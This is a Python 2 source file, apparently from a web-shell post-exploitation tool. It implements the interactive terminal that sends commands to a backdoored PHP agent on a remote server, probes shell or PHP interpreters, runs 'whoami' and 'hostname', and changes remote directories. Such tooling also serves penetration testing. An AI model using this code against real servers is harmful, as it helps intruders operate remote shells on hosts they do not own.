'''
Created on 22/ago/2011

@author: norby
'''

from core.moduleexception import ModuleException
from core.configs import Configs, dirpath, rcfilepath
from core.vector import Vector
from core.helper import Helper
import os, re, shlex

module_trigger = ':'
help_string = ':help'
set_string = ':set'
load_string = ':load'
gen_string = ':generator'


class Terminal(Helper, Configs):

    def __init__( self, modhandler):

        self.modhandler = modhandler
        self._make_home_folder()
        self.__load_rcfile(os.path.join(os.path.expanduser('~'), dirpath, rcfilepath), default_rcfile=True)
        self._init_completion()
        
    def loop(self):

        self._tprint(self._format_presentation())
        
        try:
            username, hostname = self.__env_init()
        except ModuleException, e:
            return
        
        self.__cwd_handler()
        
        while self.modhandler.interpreter:

            prompt = '{user}@{host}:{path} {prompt} '.format(
                                                             user=username, 
                                                             host=hostname, 
                                                             path=getattr(self.modhandler.load('shell.php').stored_args_namespace, 'path'), 
                                                             prompt = 'PHP>' if (self.modhandler.interpreter == 'shell.php') else '$' )

            input_cmd = raw_input( prompt ).strip()
            if input_cmd and (input_cmd[0] == ':' or input_cmd[:2] in ('ls', 'cd')):
                # This is a module call, pre-split to simulate argv list to pass to argparse 
                try:
                    cmd = shlex.split(input_cmd)
                except ValueError:
                    self._tprint('[!] [terminal] Error: command parse fail%s' % os.linesep)
                    continue
                
            elif input_cmd and input_cmd[0] != '#':
                # This is a direct command, do not split
                cmd = [ input_cmd ] 
            else:
                continue
            
            self.run_cmd_line(cmd)


    def _tprint(self, msg):
        self.modhandler._last_warns += msg + os.linesep
        if msg: print msg,
        

    def run_cmd_line(self, command):

        self._last_output = ''
        self.modhandler._last_warns = ''
        self._last_result = None
        
        try:
    
            ## Help call
            if command[0] == help_string:
                if len(command) == 2:
                    command[1] = command[1].lstrip(':')
                    if command[1] in self.modhandler.modules_classes.keys():
                        self._tprint(self._format_helps([ command[1] ]))
                    else:
                        self._tprint(self._format_helps([ m for m in self.modhandler.modules_classes.keys() if command[1] in m], summary_type=1))                        
                else:
                    self._tprint(self._format_grouped_helps())
                           
            ## Set call if ":set module" or ":set module param value"
            elif command[0] == set_string and len(command) > 1: 
                    self.modhandler.load(command[1]).store_args(command[2:])
                    self._tprint(self.modhandler.load(command[1]).format_stored_args() + os.linesep)

            ## Load call
            elif command[0] == load_string and len(command) == 2:
                # Recursively call run_cmd_line() and return to avoid to reprint last output
                self.__load_rcfile(command[1])
                return

            elif command[0] == 'cd':
                self.__cwd_handler(command)
                
            else:
                    
                ## Module call
                if command[0][0] == module_trigger:
                    interpreter = command[0][1:]
                    cmd = command[1:]
                ## Raw command call. Command is re-joined to be considered as single command
                else:
                    # If interpreter is not set yet, try to probe automatically best one
                    if not self.modhandler.interpreter:
                        self.__guess_best_interpreter()
                    
                    interpreter = self.modhandler.interpreter
                    cmd = [ ' '.join(command) ] 
                
                res, out = self.modhandler.load(interpreter).run(cmd)

                if out != '': self._last_output += out
                if res != None: self._last_result = res
                
        except KeyboardInterrupt:
            self._tprint('[!] Stopped execution%s' % os.linesep)
        except ModuleException, e:
            self._tprint('[!] [%s] Error: %s%s' % (e.module, e.error, os.linesep))
        
        if self._last_output:
            print self._last_output
        

    def __guess_best_interpreter(self):
        if Vector(self.modhandler, "shellprobe" , 'shell.sh', ['-just-probe', 'sh']).execute():
            # First, probe shell.sh
            self.modhandler.interpreter = 'shell.sh'
        elif Vector(self.modhandler, "phpprobe" , 'shell.php', ['-just-probe', 'php']).execute():
            # If other checks fails, probe explicitely php shell. Useful when shell is started directly with :shell.php call
            self.modhandler.interpreter = 'shell.php'
        else:
            # Else declare init failed
            raise ModuleException('terminal','Interpreter guess failed')
        

    def __load_rcfile(self, path, default_rcfile=False):

        path = os.path.expanduser(path)

        if default_rcfile and not os.path.exists(path):
                try:
                    rcfile = open(path, 'w').close()
                except Exception, e:
                    raise ModuleException("","Creation '%s' rc file failed" % (path))
                else:
                    return []

        last_output = ''
        last_warns = ''
        last_result = []
        
        for cmd in self._read_rc(path):
            self._tprint('[LOAD] %s%s' % (cmd, os.linesep))
            self.run_cmd_line(shlex.split(cmd))
            
            last_output += self._last_output 
            last_warns += self.modhandler._last_warns 
            last_result.append(self._last_result)
        
        if last_output: self._last_output = last_output
        if last_warns: self.modhandler._last_warns = last_warns
        if last_result: self._last_result = last_result
        

    def __cwd_handler (self, cmd = None):

        cwd_new = ''
        
        if cmd == None or len(cmd) ==1:
            cwd_new = Vector(self.modhandler,  'first_cwd', 'system.info', 'cwd').execute()
        elif len(cmd) == 2:
            cwd_new = Vector(self.modhandler,  'getcwd', 'shell.php', 'chdir("$path") && print(getcwd());').execute({ 'path' : cmd[1] })
            if not cwd_new:
                self._tprint("[!] Folder '%s' change failed, no such file or directory or permission denied%s" % (cmd[1], os.linesep))                
                return
            
        if cwd_new:
            setattr(self.modhandler.load('shell.php').stored_args_namespace, 'path', cwd_new)
        

    def __env_init(self):
        
        # At terminal start, try to probe automatically best interpreter
        self.__guess_best_interpreter()
        
        username =  Vector(self.modhandler, "whoami", 'system.info', "whoami").execute()
        hostname =  Vector(self.modhandler, "hostname", 'system.info', "hostname").execute()
        
        if Vector(self.modhandler, "safe_mode", 'system.info', "safe_mode").execute() == '1':
            self._tprint('[!] PHP Safe mode enabled%s' % os.linesep)
            
        
        return username, hostname
